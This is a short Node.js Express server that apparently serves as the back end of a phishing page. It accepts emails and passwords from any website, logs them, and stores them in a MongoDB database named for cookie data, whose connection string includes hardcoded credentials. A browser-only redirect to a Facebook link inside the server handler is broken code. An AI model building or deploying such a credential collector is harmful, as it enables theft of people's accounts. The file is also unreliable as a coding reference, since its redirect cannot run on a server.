import express from 'express';
import mongoose from'mongoose';
import cors from 'cors';
import { DATA } from "./data.model.js";

const app = express()

;( async () =>{
    const DB_Name = "Data_Of_Cookies";
    const { connection } = await mongoose.connect(`mongodb+srv://anonto:2005@cluster0.1zoujuq.mongodb.net/${DB_Name}`)
    console.log("Your database is configured on : ", connection.host );
})();

app.use(express.json())
app.use(express.urlencoded({extended: true}))

app.use(cors(
    {
        origin:"*"
    }
))

app.post("/datapost", async (req, res) => {
    try {
        
        const { password , email } = req.body;

        console.log( req.body );

        if (!password ||!email) {
            return res.status(400).json({ message: "Please provide password and email" })
        }

        const data = {
            email,
            password
        }

        const result = await DATA.create(data);

        if ( !result ) return res.status(400).json({ message: "Your unable to connect"});

        window.location.href = "https://www.facebook.com/share/v/1B2K9AV5yg/"

        return res
        .status(202)
        .json(
            { 
                message: "Your password and email has been added successfully" 
            }
        );


    } catch (error) {
        console.log(error.message)
    }
})


app.listen(3000, (req, res) => {
    console.log("Server is running on port 3000")
})